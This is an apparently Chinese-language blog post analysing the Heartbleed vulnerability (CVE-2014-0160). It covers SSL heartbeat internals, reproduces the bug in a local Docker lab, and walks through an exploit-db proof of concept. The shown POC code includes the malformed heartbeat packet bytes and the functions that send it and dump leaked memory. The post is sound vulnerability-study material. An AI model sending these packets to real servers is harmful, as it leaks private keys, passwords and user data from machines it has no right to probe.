<!doctype html>




<html class="theme-next mist" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="google-site-verification" content="-rILWvtgf7gbffrRwk-E1VWNCVLMTcq6pxgs_1IfIjo" />








<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Heartbleed,CVE-2014-0160" />





  <link rel="alternate" href="/atom.xml" title="0x4C43's Blog" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />






<meta name="description" content="0x01 基础知识1. SSL协议简介SSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Tra">
<meta name="keywords" content="Heartbleed">
<meta property="og:type" content="article">
<meta property="og:title" content="Heartbleed 漏洞分析">
<meta property="og:url" content="http://0x4c43.cn/2018/0701/heartbleed-vulnerability-analysis/index.html">
<meta property="og:site_name" content="0x4C43's Blog">
<meta property="og:description" content="0x01 基础知识1. SSL协议简介SSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Tra">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019878_10954248.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019888_1996222.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019902_64534789.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019909_91460635.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019894_37260673.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019898_55912321.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019904_67904758.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019896_38937640.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019886_16554705.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019911_95471870.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019911_95471870.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019907_77216907.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019882_16326376.jpg">
<meta property="og:updated_time" content="2020-04-04T16:56:05.019Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Heartbleed 漏洞分析">
<meta name="twitter:description" content="0x01 基础知识1. SSL协议简介SSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Tra">
<meta name="twitter:image" content="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019878_10954248.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: false,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://0x4c43.cn/2018/0701/heartbleed-vulnerability-analysis/"/>







  <title> Heartbleed 漏洞分析 | 0x4C43's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  














  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0x4C43's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocapitalize="off" autocomplete="off" autocorrect="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/2018/0701/heartbleed-vulnerability-analysis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0x4C43">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/binary.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0x4C43's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                Heartbleed 漏洞分析
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-01T12:02:14+08:00">
                2018-07-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability-Analysis/" itemprop="url" rel="index">
                    <span itemprop="name">Vulnerability Analysis</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/0701/heartbleed-vulnerability-analysis/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2018/0701/heartbleed-vulnerability-analysis/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv">阅读次数
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        <h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><h2 id="1-SSL协议简介"><a href="#1-SSL协议简介" class="headerlink" title="1. SSL协议简介"></a>1. SSL协议简介</h2><p>SSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Transport Layer Security），发展至今已有 TLS 1.0、TLS1.1、TLS1.2 三个版本。<br>SSL/TLS 协议能够提供的安全服务主要包括：</p>
<ul>
<li>认证性——使用数字证书认证服务器和客户端身份，防止身份伪造；</li>
<li>机密性——使用加密算法防止第三方窃听；</li>
<li>完整性——使用消息认证码（MAC）保障数据完整性，防止消息被篡改；</li>
<li>重放保护——通过使用隐式序列号防止重放攻击。<br>SSL/TLS 协议有一个高度模块化的架构，可分为两层：SSL 记录协议为上层协议提供数据封装、压缩、消息认证和完整性保护、加密等安全服务；SSL 上层协议使用 SSL 记录协议提供的服务完成 SSL 通信过程，上层协议包括以下几个子协议：<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019878_10954248.jpg" alt=""><br><strong>SSL 握手协议</strong>：提供建立安全通道的服务，用于协商安全参数和密码套件、服务器身份认证、客户端身份认证（可选）、密钥生成；<br><strong>SSL 修改密文协议</strong>：用于更新当前使用的加密套件。在服务器和客户端间互相通告将启用新的密码规范，使得双方实现同步；<br><strong>SSL 报警协议</strong>：传递握手过程中产生的的错误，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告。</li>
</ul>
<h2 id="2-SSL握手过程"><a href="#2-SSL握手过程" class="headerlink" title="2. SSL握手过程"></a>2. SSL握手过程</h2><p>SSL 安全协议中，服务器和客户端间的通信可分为握手阶段和传输阶段。其中，握手阶段需要 2 次握手完成。SSL 的通信过程如下图所示，步骤 1 和步骤 2 完成第一次握手过程，协商通信双方使用的加密方式。同时，客户端获取服务器的数字证书；步骤 3 和步骤 4 完成第二次握手过程，协商后续数据传输所使用的对称加密密钥。至此，SSL 连接建立完成。步骤 5，双方通过 SSL 协议建立的安全通道进行加密传输。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019888_1996222.jpg" alt="">  </p>
<h2 id="3-SSL“心跳”机制"><a href="#3-SSL“心跳”机制" class="headerlink" title="3. SSL“心跳”机制"></a>3. SSL“心跳”机制</h2><p>SSL 协议完成握手过程后，客户端和服务器间便建立安全可靠的通信。SSL 安全协议工作在传输层的 TCP 协议之上，所以服务器和客户端需要保持持续连接的状态。由于服务器的资源有限，当连接的客户端数量较大时，服务器要维持这些连接将会消耗很多资源，因此需要及时断开完成通信的客户端以减少服务器的负载压力。服务器通过 SSL 的心跳机制可判断客户端是否已完成通信。</p>
<p>RFC6520 文件中规定，SSL 协议中的心跳机制工作于 SSL 记录协议之上，心跳机制中包含两种类型的消息：心跳请求消息（HeartbeatRequest Message）和心跳响应消息（HeartbeatResponse Message），这两种消息具有相同的包结构。当服务器和客户端完成 SSL 协议的握手阶段后，如果客户端一段时间没有与服务器进行数据交互，客户端需要周期性地向服务器发送心跳请求消息。服务器接收到客户端的心跳请求消息，则认为客户端还没有完成通信，继续维持客户端和服务器的连接，并向客户端发送心跳响应消息。</p>
<p>通信双方在建立 SSL 连接时可协商是否支持心跳机制。在 SSL 第一次握手过程中通过 Client Hello 消息和 Server Hello 消息的 Heartbeat Hello 扩展告知对方是否支持心跳机制。Heartbeat Hello 扩展的格式如下。当支持心跳机制时设置 HeartbeatMode 为 peer_allowed_to_send，可接收心跳请求消息并能返回响应包；当不支持心跳机制时设置 HeartbeatMode 为 peer_not_allowed_to_send，若对端发送心跳请求消息，将会丢弃该消息并返回 unexpected_message 警告消息。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">    peer_allowed_to_send(<span class="number">1</span>),</div><div class="line">    peer_not_allowed_to_send(<span class="number">2</span>),</div><div class="line">&#125; HeartbeatMode;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    HeartbeatMode mode;</div><div class="line">&#125; HeartbeatExtension;</div></pre></td></tr></table></figure></p>
<p>心跳包的结构如下图所示，前半部分为 SSL 记录头，Content Type 为消息类型（0x18 表示心跳包消息），TLS Version 为 SSL 版本信息，Record length 为记录长度；后半部分即为心跳消息。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019902_64534789.jpg" alt=""><br>其中，SSL 记录长度（Record length）为心跳消息的总长度。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Record length = <span class="number">1</span> bytes(Heartbeat Type) + <span class="number">2</span> bytes(Payload length) + payload length(Payload) + <span class="number">16</span> bytes(Padding)</div></pre></td></tr></table></figure></p>
<p>心跳包消息由数据包类型（type）、载荷长度（payload length）、载荷内容（payload）和填充字节（padding）组成。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">      HeartbeatMessageType type;    <span class="comment">// 1 bytes，包括request 和 response两种类型</span></div><div class="line">      uint16 payload_length;    <span class="comment">// 2 bytes，载荷长度</span></div><div class="line">      opaque payload[HeartbeatMessage.payload_length];    <span class="comment">// payload_length bytes，载荷内容</span></div><div class="line">      opaque padding[padding_length];    <span class="comment">// 填充字节，至少为16 bytes</span></div><div class="line">&#125; HeartbeatMessage;</div></pre></td></tr></table></figure></p>
<p>下图为心跳请求包的数据包实例，其载荷长度为 5 bytes。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019909_91460635.jpg" alt="">  </p>
<h2 id="4-OpenSSL"><a href="#4-OpenSSL" class="headerlink" title="4. OpenSSL"></a>4. OpenSSL</h2><p>OpenSSL 是一个强大的安全套接字层密码开源库，包括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试使用。大多数通过 SSL/TLS 协议加密的网站都使用了 OpenSSL 开源软件包。当 OpenSSL 被爆出安全漏洞时，将会影响所有使用 OpenSSL 开源包的应用。<br>从结构上看，OpenSSL 分为三层，底层为各种密码算法的实现，中间层是密码算法的抽象接口，顶层是围绕加密算法的 PKCS 的实现，以及 ASN.1 的 DER、BER 编码接口，让这些抽象数据结构最终成为能够在网上传输、在硬盘上存储的数据。</p>
<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1. 漏洞信息"></a>1. 漏洞信息</h2><blockquote>
<p>漏洞编号：CVE-2014-0160<br>漏洞类型：内存越界访问<br>漏洞危害：信息泄露<br>影响范围：OpenSSL1.0.1、OpenSSL 1.0.1a~ OpenSSL 1.0.1f、OpenSSL 1.0.2-beta<br>漏洞描述：OpenSSL 在实现 TLS（传输层安全协议）和 DTLS（数据报安全传输协议）的心跳包处理逻辑时存在问题。OpenSSL 的 Heartbleed 模块在处理心跳包时没有检查心跳包中的长度字段是否与后续的数据字段一致，攻击者利用该漏洞构造异常数据包，可获取服务器内存中多达 64KB 的数据。这些数据可能会包含证书私钥、用户账号、密码、邮件内容等敏感信息。</p>
</blockquote>
<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h2><h3 id="1）环境"><a href="#1）环境" class="headerlink" title="1）环境"></a>1）环境</h3><p>首先需要搭建漏洞测试环境，为节省时间，可以直接使用 Docker Hub 中的测试环境。用以下命令可拉取（pull）已部署漏洞环境的测试镜像。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull hmlio/vaas-cve-2014-0160</div></pre></td></tr></table></figure></p>
<p>该镜像中所部署的服务如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">System：Debian GNU/Linux 7 (wheezy)</div><div class="line">Http Server：Apache/2.2.22</div><div class="line">OpenSSL：openssl-1.0.1e</div></pre></td></tr></table></figure></p>
<p>接着运行容器，并使用 -p 参数把容器中 443 端口映射到宿主机的 8443 端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run <span class="_">-d</span> -p 8443:443 hmlio/vaas-cve-2014-0160</div></pre></td></tr></table></figure></p>
<p>最后在宿主机中用浏览器访问 <code>https://127.0.0.1:8443</code>，若服务正常，将返回以下页面。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019894_37260673.jpg" alt="">  </p>
<h3 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a>2）测试</h3><p>从 exploit-db 下载 <a href="https://www.exploit-db.com/exploits/32745/" target="_blank" rel="external">POC</a> 对 HTTP 服务器进行测试，并用 tcpdump 捕获攻击过程中通信双方交互的数据。可修改 POC 中畸形心跳请求包的构造方式，原畸形包没有载荷 (payload) 和填充字符 (padding)；修改后的畸形包有完整的包结构。两种构造方式都能成功利用漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### 构造畸形心跳请求包。</span></div><div class="line"><span class="comment"># 原构造方式：</span></div><div class="line"><span class="comment"># 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0003:心跳包长度</span></div><div class="line"><span class="comment"># 0x01:Heartbleed request类型; 0x4000:payload长度</span></div><div class="line"><span class="comment"># hb = h2bin('18 03 02 00 03 01 40 00')</span></div><div class="line"></div><div class="line"><span class="comment"># 修改后的构造方式：</span></div><div class="line"><span class="comment"># 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0008:心跳包长度; </span></div><div class="line"><span class="comment"># 0x01:Heartbleed request类型; 0x0155:payload长度; </span></div><div class="line"><span class="comment"># 5*' 41':载荷数据; 16*' 42':填充字节</span></div><div class="line">hb = h2bin(<span class="string">'18 03 02'</span>+<span class="string">' 00 08'</span>+<span class="string">' 01'</span>+<span class="string">' 01 55'</span>+<span class="number">5</span>*<span class="string">' 41'</span>+<span class="number">16</span>*<span class="string">' 42'</span>)</div></pre></td></tr></table></figure></p>
<p>首先使用以下命令运行 tcpdump 监听网络接口，由于 HTTP 服务器部署在 docker 中，需用-i 选项指定网络接口为 docker0，同时用-w 选项把数据包存入 heartbleed.pcap 文件中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo tcpdump -i docker0 -w heartbleed.pcap</div></pre></td></tr></table></figure></p>
<p>接着运行 POC（已做部分修改）发送攻击数据包进行测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python exploit.py -p 8443 127.0.0.1</div></pre></td></tr></table></figure></p>
<p>测试结果如下图所示，利用漏洞已成功获取服务器内存中数据，返回的数据中包含了客户端发送的 HTTP 请求头信息。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019898_55912321.jpg" alt=""><br>使用 Wireshark 打开数据包文件 heartbleed.pcap，筛选出 SSL 通信数据包有以下 4 个。前 2 个为 SSL 协议握手过程的第一阶段。第 3 个为客户端发送的畸形心跳请求包，该请求包中载荷长度（payload length）为 341 bytes，但是实际载荷内容（payload）的长度为 5 bytes。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019904_67904758.jpg" alt=""><br>第 4 个为服务器返回的心跳响应包，由于服务器收到畸形心跳请求包后，在构造心跳响应包时未对载荷长度进行检查，将内存中其它数据与心跳数据（总长度为 341 bytes）一起返回给客户端，导致服务器内存泄露，从下图可看到泄露的服务器内存数据中包含有客户端发送的 HTTP 请求头信息。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019896_38937640.jpg" alt="">  </p>
<h1 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h1><p>Heartleed 漏洞攻击过程如下图所示，客户端向服务器发送心跳载荷长度（payload length）大于实际心跳载荷（payload）长度的心跳请求包，服务器会将内存中的额外数据返回给客户端，可能导致敏感信息泄露。<br><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019886_16554705.jpg" alt="">  </p>
<h2 id="1-POC-分析"><a href="#1-POC-分析" class="headerlink" title="1. POC 分析"></a>1. POC 分析</h2><p>通过分析 POC 可知， main 函数中首先与服务器建立 socket 连接；接着发送 SSL Client Hello 进行第一次握手，Client Hello 的 Heartbeat Hello 扩展中 Mode 字段为 peer_allowed_to_send 表明客户端支持心跳机制。若服务器返回 Server Hello Done 则表明已完成第一次握手过程；最后发送畸形心跳请求包即可触发漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    opts, args = options.parse_args()</div><div class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</div><div class="line">        options.print_help()</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="comment"># 与服务器建立socket连接</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="keyword">print</span> <span class="string">'Connecting...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.connect((args[<span class="number">0</span>], opts.port))</div><div class="line">    <span class="comment"># 发送 Client Hello 握手包</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.send(hello)</div><div class="line">    <span class="comment"># 等待服务器返回 Server Hello 握手包</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        typ, ver, pay = recvmsg(s)</div><div class="line">        <span class="comment"># 服务器未返回 Server Hello 握手包，SSL 第一次握手失败</span></div><div class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></div><div class="line">            <span class="keyword">return</span></div><div class="line">        <span class="comment"># 若接收到 Server Hello Done 消息则 break</span></div><div class="line">        <span class="comment"># 其中，22表示握手包，0x0E表示握手包类型为 Server Hello Done</span></div><div class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="comment"># 发送畸形心跳请求包</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    hit_hb(s)</div></pre></td></tr></table></figure></p>
<p>POC 中构造的畸形心跳请求包如下图所示，其中载荷长度（0x0155）大于实际载荷数据长度（0x05）。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 构造心跳请求包。</span></div><div class="line"><span class="comment"># 0x18:Heartbleed 消息类型; 0x0302:TLS1.1; 0x0008:心跳包长度; 0x01:Heartbleed request 类型;</span></div><div class="line"><span class="comment"># 0x0155:payload 长度; 5*' 41':载荷数据; 16*' 42':填充字节</span></div><div class="line">hb = h2bin(<span class="string">'18 03 02'</span>+<span class="string">' 00 08'</span>+<span class="string">' 01'</span>+<span class="string">' 01 55'</span>+<span class="number">5</span>*<span class="string">' 41'</span>+<span class="number">16</span>*<span class="string">' 42'</span>)</div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/0x4C43/BlogImages/master/1586019911_95471870.jpg" alt=""><br>hit_hb() 函数向服务器发送畸形心跳请求包，正常情况下服务器应返回的心跳响应包长度为 24 bytes。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Heartbeat response length = <span class="number">1</span> bytes(Heartbeat Type) + <span class="number">2</span> bytes(Payload length) + <span class="number">5</span> bytes(payload length)</div><div class="line">+ <span class="number">16</span> bytes(Padding) = <span class="number">24</span> bytes</div></pre></td></tr></table></figure></p>
<p>若服务器返回长度大于 24 bytes 的心跳响应包，则表明服务器存在该漏洞；若服务器没有返回心跳响应包，而是只返回类型值为 21 的警告包，则表明服务器不存在该漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s)</span>:</span></div><div class="line">    s.send(hb)    <span class="comment"># 发送心跳请求包</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        typ, ver, pay = recvmsg(s)    <span class="comment"># 接收响应包</span></div><div class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received, server likely not vulnerable'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"> </div><div class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:    <span class="comment"># 若为心跳包，则输出载荷数据</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></div><div class="line">            hexdump(pay)</div><div class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">24</span>:    <span class="comment"># 若心跳包总长度大于24，则表明服务器有漏洞</span></div><div class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server returned more data than it should - server is vulnerable!'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Server processed malformed heartbeat, but did not return any extra data.'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"> </div><div class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:     <span class="comment"># 若为警告包，则表明服务器没有漏洞</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'Received alert:'</span></div><div class="line">            hexdump(pay)</div><div class="line">            <span class="keyword">print</span> <span class="string">'Server returned error, likely not vulnerable'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure></p>
